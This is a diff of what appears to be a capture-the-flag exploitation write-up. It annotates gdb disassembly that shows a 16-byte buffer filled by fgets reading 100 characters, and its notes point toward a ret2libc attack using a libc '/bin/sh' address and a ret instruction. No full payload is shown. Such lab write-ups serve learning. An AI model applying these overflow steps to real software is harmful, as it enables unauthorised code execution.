@@ -1,17 +1,17 @@
 gdb> disass main
-0x080484db <+11>:	lea    ebx,[esp+0x1c]
-0x080484df <+15>:	mov    eax,0x0
-0x080484e4 <+20>:	mov    edx,0x10
-0x080484e9 <+25>:	mov    edi,ebx
-0x080484eb <+27>:	mov    ecx,edx
-0x080484ed <+29>:	rep stos DWORD PTR es:[edi],eax
-[...]
-0x0804855c <+140>:	mov    eax,ds:0x804a020
-0x08048561 <+145>:	mov    DWORD PTR [esp+0x8],eax
-0x08048565 <+149>:	mov    DWORD PTR [esp+0x4],0x64
-0x0804856d <+157>:	lea    eax,[esp+0x1c]
-0x08048571 <+161>:	mov    DWORD PTR [esp],eax
-0x08048574 <+164>:	call   0x8048370 <fgets@plt>
+    0x080484db <+11>:	lea    ebx,[esp+0x1c]
+    0x080484df <+15>:	mov    eax,0x0
+    0x080484e4 <+20>:	mov    edx,0x10
+    0x080484e9 <+25>:	mov    edi,ebx
+    0x080484eb <+27>:	mov    ecx,edx
+    0x080484ed <+29>:	rep stos DWORD PTR es:[edi],eax   ; memset(buffer, 0x0, 0x10)
+    [...]
+    0x0804855c <+140>:	mov    eax,ds:0x804a020         ; <stdin@@GLIBC_2.0>
+    0x08048561 <+145>:	mov    DWORD PTR [esp+0x8],eax
+    0x08048565 <+149>:	mov    DWORD PTR [esp+0x4],0x64
+    0x0804856d <+157>:	lea    eax,[esp+0x1c]
+    0x08048571 <+161>:	mov    DWORD PTR [esp],eax
+    0x08048574 <+164>:	call   0x8048370 <fgets@plt>    ; fgets(buffer, 0x64, stdin)
 # Here we can see a buffer of length 16 where we try to store 100 chars
 # We can try exploit this
 
@@ -50,7 +50,7 @@ libc : 0xf7f897ec ("/bin/sh")
 # And we need a return address
 gdb> disass main
 [...]
-0x080485b5 <+229>:	ret
+    0x080485b5 <+229>:	ret
 [...]
 
 # We need to write 255 char for the first `fgets`
